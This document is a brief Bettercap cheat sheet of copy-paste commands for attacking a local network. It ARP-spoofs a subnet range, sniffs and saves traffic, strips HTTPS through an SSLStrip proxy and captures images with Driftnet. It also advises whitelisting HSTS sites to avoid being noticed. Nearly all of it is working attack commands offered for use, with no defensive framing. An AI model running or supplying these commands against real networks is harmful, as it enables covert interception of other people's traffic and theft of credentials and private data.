# Bettercap Quick Commands


Beware: Commands might be outdated


## One liner
Note: Make sure to edit output file `<DATE>`and list of IP Addresses `X.X.X.1-253` to spoof

1. Run bettercap
    ```bash
    ./bettercap -iface eth0 -eval "set net.sniff.filter not arp and not udp dst port 53 and not udp dst port 5353;set net.sniff.output arp.spoof.<DATE>.cap;net.sniff on;set arp.spoof.targets X.X.X.1-253;arp.spoof on"
    ```
1. Open pcap in wireshark and input “http” on the filter box


---

## Detailed version
* Basic Setup
    ```bash
    net.sniff.output bettercap-output
    set net.sniff.filter not arp and not udp dst port 53 and not udp dst port 5353
    net.sniff on
    ```
* ARP Spoofing part
    ```bash
    set arp.spoof.targets x.x.x.1-253 # Make sure to avoid including gateways & network switches
    arp.spoof on
    ```

* HTTP Proxy for SSLStrip (*BEWARE of websites that use HSTS. Avoid or whitelist at all costs to avoid disruption or being noticed*)
    ```bash
    set http.proxy.port 8080
    set http.proxy.whitelist <subnet_to_whiltelist_1/24>,<subnet_to_whiltelist_2/28>,<subnet_to_whiltelist_3/32>
    set http.proxy.sslstrip <true/false>
    http.proxy on
    ```
* Turn of Driftnet
    ```bash
    driftnet -d <Driftnet_save_folder_directory> -i eth0
    ```
* Logging
    ```bash
    ./bettercap ... 2>&1 | tee “bettercap.log”
    ```
---
## Tips
* To turn on webUI (*WARNING: This will slow down you kali and bettercap a lot. If you slow down you Kali or bettercap, the network/target traffic that you are intercepting slows down too*)
    * start bettercap with
     ```bash
     ./bettercap -caplet http-ui ... ... ... ...
     ```
    * Manual (Already in bettercap cli)
     ```bash
     include http.ui
     set http.server.port 8888 
     http.server off
     http.server on
     ```
